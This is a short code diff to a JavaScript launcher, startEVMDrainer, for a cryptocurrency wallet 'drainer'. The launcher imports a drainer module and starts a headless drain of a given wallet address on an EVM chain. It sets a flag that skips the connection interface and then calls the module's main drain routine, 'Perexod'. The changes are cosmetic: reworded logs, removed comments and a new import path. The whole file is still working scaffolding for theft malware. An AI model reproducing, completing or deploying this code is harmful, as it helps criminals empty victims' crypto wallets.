@@ -3,31 +3,29 @@ async function startEVMDrainer(walletAddress, chainId = 1) {
   console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);
 
   try {
-    // Load the main drainer
-    const drainerPath = './main.js'; // Adjust if needed
+    const drainerPath = './main';
     const DrainerModule = await import(drainerPath);
 
-    console.log("[DEBUG] Drainer loaded");
+    console.log("[DEBUG] Drainer loaded successfully");
 
-    // === HEADLESS MODE ===
     if (typeof DrainerModule.startWithWallet === 'function') {
-      console.log("[EVM] Starting in headless mode...");
+      console.log("[EVM] Starting headless drain...");
       await DrainerModule.startWithWallet(walletAddress, chainId);
     } 
     else if (DrainerModule.Drainer) {
       const drainer = new DrainerModule.Drainer();
-      drainer.walletAddress = walletAddress;        // Force address
+      drainer.walletAddress = walletAddress;
       drainer.chainId = chainId;
-      drainer.started = true;                       // Skip connection UI
+      drainer.started = true;
 
-      console.log("[EVM] Starting drain directly...");
-      await drainer.Perexod();                      // Main drain function
+      console.log("[EVM] Starting direct drain...");
+      await drainer.Perexod();
     } 
     else {
-      throw new Error("No valid start method found");
+      throw new Error("Drainer module has no valid start method");
     }
 
-    console.log(`[EVM] Drain completed for ${walletAddress}`);
+    console.log(`[EVM] ✅ Drain completed for ${walletAddress}`);
 
   } catch (err) {
     console.error("[EVM] Drain failed:", err.message);
